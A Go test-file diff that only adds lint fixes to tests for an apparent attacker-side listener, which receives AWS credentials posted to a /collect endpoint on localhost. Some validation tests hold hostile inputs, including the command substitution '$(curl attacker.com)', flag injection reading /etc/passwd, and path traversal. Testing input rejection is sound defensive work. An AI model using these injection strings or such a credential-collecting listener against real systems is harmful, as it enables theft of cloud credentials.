@@ -53,14 +53,14 @@ func TestCredentialsHandlerGlueFormat(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		received = creds
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	body := `{"credentials":{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","session_token":"FwoGZXIvYXdzEBAaDNYX3456789012345678"}}`
 	resp := postJSON(t, url, body)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	if resp.StatusCode != http.StatusOK {
 		t.Fatalf("Expected 200, got %d", resp.StatusCode)
@@ -85,14 +85,14 @@ func TestCredentialsHandlerLambdaFormat(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		received = creds
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	body := `{"credentials":{"access_key":"AKIALAMBDA7EXAMPLE1","secret_key":"LambdaSecretKeyExample12345678901","token":"FwoGZXIvYXdzLambdaToken123456789"}}`
 	resp := postJSON(t, url, body)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	time.Sleep(100 * time.Millisecond)
 
@@ -109,14 +109,14 @@ func TestCredentialsHandlerEC2Format(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		received = creds
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	body := `{"Credentials":{"AccessKeyId":"ASIAEC2TEST12345678","SecretAccessKey":"EC2SecretKeyExampleValue1234567890","Token":"FwoGZXIvYXdzEC2TokenExample12345"}}`
 	resp := postJSON(t, url, body)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	time.Sleep(100 * time.Millisecond)
 
@@ -130,14 +130,14 @@ func TestCredentialsHandlerFlatFormat(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		received = creds
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	body := `{"access_key_id":"AKIAFLAT1234567890AB","secret_access_key":"FlatSecretKeyExampleValue12345678","arn":"arn:aws:iam::123456789012:role/TestRole"}`
 	resp := postJSON(t, url, body)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	time.Sleep(100 * time.Millisecond)
 
@@ -153,7 +153,7 @@ func TestCredentialsHandlerMissingFields(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		t.Error("Should not have received credentials for invalid request")
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
@@ -161,7 +161,7 @@ func TestCredentialsHandlerMissingFields(t *testing.T) {
 	// Missing secret key
 	body := `{"access_key_id":"AKIATEST12345678"}`
 	resp := postJSON(t, url, body)
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for missing fields, got %d", resp.StatusCode)
@@ -172,7 +172,7 @@ func TestCredentialsHandlerRejectsFlagInjection(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		t.Error("Should not have received credentials with injected flags")
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
@@ -180,7 +180,7 @@ func TestCredentialsHandlerRejectsFlagInjection(t *testing.T) {
 	// Access key containing flag-like value
 	body := `{"access_key_id":"--from-file","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`
 	resp := postJSON(t, url, body)
-	resp.Body.Close()
+	_ = resp.Body.Close()
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for flag injection in access key, got %d", resp.StatusCode)
 	}
@@ -188,7 +188,7 @@ func TestCredentialsHandlerRejectsFlagInjection(t *testing.T) {
 	// Region containing injected value
 	body = `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","region":"--from-file /etc/passwd"}`
 	resp = postJSON(t, url, body)
-	resp.Body.Close()
+	_ = resp.Body.Close()
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for flag injection in region, got %d", resp.StatusCode)
 	}
@@ -196,7 +196,7 @@ func TestCredentialsHandlerRejectsFlagInjection(t *testing.T) {
 	// Secret key with shell injection attempt
 	body = `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"$(curl attacker.com)"}`
 	resp = postJSON(t, url, body)
-	resp.Body.Close()
+	_ = resp.Body.Close()
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for shell injection in secret key, got %d", resp.StatusCode)
 	}
@@ -206,7 +206,7 @@ func TestCredentialsHandlerRejectsInvalidARN(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		t.Error("Should not have received credentials with invalid ARN")
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
@@ -214,7 +214,7 @@ func TestCredentialsHandlerRejectsInvalidARN(t *testing.T) {
 	// Path traversal in ARN
 	body := `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","arn":"../../etc/passwd"}`
 	resp := postJSON(t, url, body)
-	resp.Body.Close()
+	_ = resp.Body.Close()
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for path traversal in ARN, got %d", resp.StatusCode)
 	}
@@ -224,13 +224,13 @@ func TestCredentialsHandlerInvalidJSON(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		t.Error("Should not have received credentials for invalid JSON")
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	resp := postJSON(t, url, "not json at all")
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	if resp.StatusCode != http.StatusBadRequest {
 		t.Fatalf("Expected 400 for invalid JSON, got %d", resp.StatusCode)
@@ -241,7 +241,7 @@ func TestCredentialsHandlerWrongMethod(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		t.Error("Should not have received credentials for GET request")
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
@@ -255,7 +255,7 @@ func TestCredentialsHandlerWrongMethod(t *testing.T) {
 	if err != nil {
 		t.Fatalf("GET request failed: %v", err)
 	}
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	if resp.StatusCode != http.StatusMethodNotAllowed {
 		t.Fatalf("Expected 405 for GET, got %d", resp.StatusCode)
@@ -264,7 +264,7 @@ func TestCredentialsHandlerWrongMethod(t *testing.T) {
 
 func TestHealthEndpoint(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/health", config.HTTPSPort)
@@ -278,7 +278,7 @@ func TestHealthEndpoint(t *testing.T) {
 	if err != nil {
 		t.Fatalf("Health check failed: %v", err)
 	}
-	defer resp.Body.Close()
+	defer func() { _ = resp.Body.Close() }()
 
 	if resp.StatusCode != http.StatusOK {
 		t.Fatalf("Expected 200, got %d", resp.StatusCode)
@@ -286,7 +286,7 @@ func TestHealthEndpoint(t *testing.T) {
 
 	body, _ := io.ReadAll(resp.Body)
 	var result map[string]string
-	json.Unmarshal(body, &result)
+	_ = json.Unmarshal(body, &result)
 	if result["status"] != "ok" {
 		t.Errorf("Expected status ok, got %s", result["status"])
 	}
@@ -337,7 +337,7 @@ func TestListenerDoubleStart(t *testing.T) {
 	config.PublicIP = "127.0.0.1"
 
 	listener := attacker.NewUnifiedListener(config)
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	if err := listener.Start(); err != nil {
 		t.Fatalf("First start failed: %v", err)
@@ -367,16 +367,16 @@ func TestListenerCredsStats(t *testing.T) {
 	listener := setupTestListener(t, func(creds attacker.ReceivedCredentials) {
 		received++
 	})
-	defer listener.Stop()
+	defer func() { _ = listener.Stop() }()
 
 	config := listener.GetConfig()
 	url := fmt.Sprintf("https://127.0.0.1:%d/collect", config.HTTPSPort)
 
 	body := `{"access_key_id":"AKIAIOSFODNN7EXAMPLE","secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`
 	resp1 := postJSON(t, url, body)
-	resp1.Body.Close()
+	_ = resp1.Body.Close()
 	resp2 := postJSON(t, url, body)
-	resp2.Body.Close()
+	_ = resp2.Body.Close()
 
 	time.Sleep(200 * time.Millisecond)
 
@@ -520,6 +520,6 @@ func findFreePort(t *testing.T) int {
 		t.Fatalf("Failed to find free port: %v", err)
 	}
 	port := l.Addr().(*net.TCPAddr).Port
-	l.Close()
+	_ = l.Close()
 	return port
 }
